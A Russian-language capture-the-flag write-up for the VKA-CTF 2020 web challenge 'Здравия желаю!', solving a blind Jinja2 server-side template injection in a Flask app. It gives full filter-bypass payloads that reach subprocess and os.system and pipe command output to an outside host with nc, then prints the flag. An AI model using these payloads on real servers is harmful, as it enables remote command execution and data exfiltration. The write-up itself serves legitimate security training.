## Здравия желаю!

| Событие | Название | Категория | Сложность |
|:--------|:---------|:----------|----------:|
| VKA-CTF`2020 | Здравия желаю! | Web | ВЫПУСК |

### Описание
> Автор: [ 𝕂𝕣𝕒𝕦𝕤𝕖 ]
>
> Начальник курса привык, что каждое утро его приветствуют подчиненные. Во время самоизоляции пришлось перестроиться на "удаленный" режим работы. И как же теперь жить без старых привычек? Все просто - задачу поставил, [результат](https://hello.vkactf.tk) получил. Вот насколько качественный - это уже другой вопрос.

### Решение

![](./imgs/1.PNG)

[Wappalyzer](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=ru) определил, что сервер написан на веб фреймворке [Flask](https://flask.palletsprojects.com/)

Также, мы видим, что сервер возвращает нам всё, что мы введём в параметр `rank`

Исходя из этого, можно предположить, что сервер уязвим для [SSTI](https://defcon.ru/web-security/3840/)

Попробовав некоторые нагрузки, сервер отвечал
```Здравия желаю, товарищ noname, не пытайся взломать меня :)!```

Скорее всего на сервере фильтруется параметр `rank` и многие нагрузки недоступны. Продолжаем искать

Введя 

```jinja2
{% if 'hack' == 'hack' %} jinja2 {% endif %}
```

сервер нам вернул `jinja2`

Это означает, что на сервере фильтруются `{{` и `}}`, следовательно мы не сможем ничего вернуть на страницу (**BLIND**)

Далее мы можем определить, какие символы нам доступны для проведения инъекции. Вместо `jinja2` в нашей нагрузке подставляем различные символы и понимаем, что нам доступны лишь кавычка, `(` и `)`

Нам не доступны такие объекты, как `self`, `config`, `request`, `url_for`, а также недоступен символ `_` , что очень сильно нас ограничивает

Нам доступны кавычки, а значит мы можем попробовать подняться до класса `object` 

Для реализации данной инъекции нам необходим символ `_`

Так как мы не можем напрямую ввести его, то попробуем найти его в каком-нибудь классе, с помощью фильтров `jinja2` преобразовать его в строку, затем в список, а после обратить к элементу списка, а именно к `_`

```python
obj|string|list[20]
```

Этот символ есть в объекте `lipsum`, но возникает проблема в обращении элементу списка, так как мы не можем использовать `[` и `]`

> Оказвается, вместо `_` можно было использовать `\137` (Решение игрока @exp101t)

У `jinja2` есть фильтр `random`, который возвращает случайный элемент списка. Таким образом мы можем получить символ `_` следующим способом (когда нам повезёт :) )

```python
lipsum|string|random
```

Так как нам недоступны символ точки и квадратных скобок, мы можем воспользоваться конструкцией ```|attr()```

Также, чтобы не использовать каждый раз объект `lipsum` создадим переменную

```jinja2
{% set x = lipsum|string|random %}
```

Исходя из вышесказанного и используя фильтр `|join` , можно сделать следующую замену

```python
''.__class__ -> ''|attr((x,x,'class',x,x)|join)
```

Теперь когда мы можем использовать `_` обратимся к элементу через метод `__getitem__(x)`

```python
[2] -> __getitem__(2)
```
Дойдя таким образом до класса `object` , необходимо найти класс `popen` . Так как мы работаем вслепую, можно отправлять запрос ниже с параметрами ```('ls',shell=True,stdout=-1)```

```python
''.__class__.__base__.__subclasses__()[<num>]('ls',shell=True,stdout=-1) -> ''|attr((x,x,'class',x,x)|join)|attr((x,x,'base',x,x)|join)|attr((x,x,'subclasses',x,x)|join)()|attr((x,x,'getitem',x,x)|join)(<num>)('ls',shell=True,stdout=-1)
```

Те классы, которые не ожидают этих параметров, сообщат об ошибке (в нашем случае - “noname, ты всё сломал”). Также не забываем, что сервер может вернуть ошибку, когда из `random` не выпал `_`

В моём случае безошибочно сработали числа 76, 84, 126, 145, 266, 401, 405

Теперь, когда мы “предположительно” можем выполнять команду на сервере, получим результат её выполнения через сторонний ресурс, использовав подключение по `nc`. Не забываем, что нам нельзя использовать точку, следовательно необходимо конвертировать ip адрес в десятичное представление, например [тут](https://www.browserling.com/tools/ip-to-dec)

Используем следующую  нагрузку для этого

```jinja2
{% set x=lipsum|string|random %}{% if ''|attr((x,x,'class',x,x)|join)|attr((x,x,'base',x,x)|join)|attr((x,x,'subclasses',x,x)|join)()|attr((x,x,'getitem',x,x)|join)(<num>)('ls | nc 134744072 9090',shell=True,stdout=-1)|attr('communicate')()|first|attr('strip')() == 'KRAUSE' %} a {%  endif %}
```

что соответствует нагрузке

```python
''.__class__.__base__.__subclasses__()[<name>]('ls | nc 8.8.8.8 9090',shell=True,stdout=-1).communicate()[0].strip()
```

**NOTE:** фильтр `|first` используется для обращения к первому элемент списка

На сервере открываем соединение и ждём подключения …

Когда подключение произойдёт сохраняем себе номер класса и радуемся, увидев результат выполнения команды

```bash
☁  ~  nc -nvlp 9090
Listening on [0.0.0.0] (family 0, port 9090)
Connection from xx.xx.xx.xx 19386 received!
app.py
flag
requirements.txt
```

Выполняем `cat flag` и получаем флаг)

-----
### Решение игрока @exp101t
Решить можно было и без брутфорса, например используя нагрузку 
```python
{% if lipsum|attr('\137\137globals\137\137')|attr('\137\137getitem\137\137')('\137\137builtins\137\137')|attr('get')('eval')('\137\137import\137\137("os")\56system("\154\163\40\174\40\156\143\40\70\56\70\56\70\56\70\40\71\60\71\60")') %} True {% else %} False {% endif %}
```
что соответствует нагрузке
```python
{% if lipsum.__globals__["__builtins__"].eval('__import__("os").system("ls | nc 8.8.8.8 9090")') %} True {% else %} False {% endif %}
```
---

**Флаг:**

> vka{cr4zy_byp455_5571_f1l73r5_my_c0n6r47ul4710n5}